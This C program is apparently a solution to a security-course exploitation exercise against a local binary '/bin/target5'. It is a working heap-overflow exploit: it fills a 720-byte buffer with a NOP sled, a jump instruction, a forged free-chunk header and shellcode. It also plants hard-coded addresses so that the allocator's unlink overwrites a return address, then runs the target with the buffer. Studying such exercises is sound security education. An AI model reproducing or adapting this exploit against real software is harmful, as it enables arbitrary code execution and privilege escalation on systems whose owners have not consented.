#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/bin/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[720];
  memset(buf, 0x90, sizeof(buf) - 1);

  // skip the fake right ptr, jmp 6 bytes below
  buf[0] = 0xeb;
  buf[1] = 0x06;
 
  // put fake free bit in p->s.r
  *(unsigned int *)(buf + 4) = 0x90909091;

  // supply shellcode
  memcpy(buf + 8, shellcode, sizeof(shellcode) - 1); 

  // put address of shellcode q->s.l 
  *(unsigned int *)(buf + 360) = 0x8049dc8; 

  // put address of return address q->s.r
  *(unsigned int *)(buf + 364) = 0xffffdb74;

  buf[719] = 0; 

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
